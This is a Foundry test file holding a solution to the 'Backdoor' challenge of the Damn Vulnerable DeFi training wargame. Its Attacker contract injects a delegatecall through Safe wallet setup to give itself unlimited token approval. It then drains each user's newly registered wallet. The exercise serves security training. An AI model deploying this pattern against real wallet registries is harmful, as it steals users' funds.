// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        Attacker attacker = new Attacker();
        attacker.attack(token, singletonCopy, walletFactory, walletRegistry, users, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract Attacker {
    function attack(
        DamnValuableToken token,
        Safe singletonCopy,
        SafeProxyFactory walletFactory,
        WalletRegistry walletRegistry,
        address[] memory users,
        address recovery
    ) external {
        // This attack exploits the fact that each Safe wallet created on behalf of
        // a user will receive tokens upon initialization. We bypass certain
        // restrictions in the WalletRegistry by leveraging the ModuleManager's
        // setupModules function, which is called within Safe::setup. This allows us
        // to perform a delegate call, setting token approval for this contract during
        // the wallet setup process.
        //
        // The goal is to create a wallet for each user, set an approval for the
        // attacker contract to transfer the tokens, and then extract the tokens from
        // each newly created wallet.
        address[] memory owners = new address[](1);

        for (uint8 i = 0; i < users.length; i++) {
            // Set the current user as the owner of the wallet to be created
            owners[0] = users[i];

            bytes memory setupData = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,
                1,
                address(this),
                abi.encodeWithSelector(
                    Attacker.setTokenApprove.selector,
                    token,
                    address(this)
                ),
                address(0),
                address(0),
                0,
                address(0)
            );

            walletFactory.createProxyWithCallback(
                address(singletonCopy),
                setupData,
                0,
                walletRegistry
            );

            // With the wallet created, pass the funds to the recovery contract
            token.transferFrom(walletRegistry.wallets(users[i]), address(this), 10 ether);
            token.transfer(recovery, 10 ether);
        }
    }

    // This function is invoked via a delegate call from the Safe::setup call.
    // Its purpose is to set an unlimited approval for the attacker contract to
    // spend the victim's tokens.
    //
    // Note: Since this is a delegate call, the parameters must be passed
    // explicitly, as opposed to relying on the contract's state variables or `this`
    // pointer.
    function setTokenApprove(DamnValuableToken token, address attackerAddress) external {
        token.approve(attackerAddress, type(uint256).max);
    }
}
